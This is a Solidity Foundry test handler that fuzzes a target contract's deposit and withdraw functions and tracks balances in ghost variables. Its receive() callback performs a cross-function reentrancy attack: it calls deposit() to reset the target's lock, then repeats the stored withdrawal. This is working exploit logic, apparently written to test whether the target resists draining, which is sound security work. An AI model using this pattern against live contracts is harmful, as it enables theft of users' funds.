// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test} from "forge-std/Test.sol";

contract CrossHandlerV19 is Test {
    address public target;
    uint256 public ghost_deposited;
    uint256 public ghost_withdrawn;
    mapping(address => uint256) public ghost_bal;
    bytes public lastData;
    uint256 public attackCount;

    constructor(address _t) { target = _t; }

    function deposit(uint96 amt) public {
        amt = uint96(bound(amt, 0.1 ether, 1 ether));
        attackCount = 0;
        vm.deal(address(this), address(this).balance + amt);
        (bool ok,) = target.call{value: amt}(abi.encodeWithSignature("deposit()"));
        if (ok) { ghost_deposited += amt; ghost_bal[address(this)] += amt; }
    }

    function withdraw(uint96 amt) public {
        uint256 bal = ghost_bal[address(this)];
        if (bal == 0) return;
        amt = uint96(bound(amt, 0.1 ether, bal));
        lastData = abi.encodeWithSignature("withdraw(uint256)", amt);
        attackCount = 0;
        uint256 before = address(this).balance;
        (bool ok,) = target.call(lastData);
        if (ok && address(this).balance > before) {
            uint256 gained = address(this).balance - before;
            ghost_withdrawn += gained;
            ghost_bal[address(this)] -= gained;
        }
    }

    receive() external payable {
        if (attackCount < 2 && lastData.length > 0) {
            attackCount++;
            // CROSS-FUNCTION: chama deposit() pra resetar o lock!
            (bool ok1,) = target.call{value: 0}(abi.encodeWithSignature("deposit()"));
            // agora withdraw de novo deve funcionar
            (bool ok2,) = target.call(lastData);
        }
    }
}
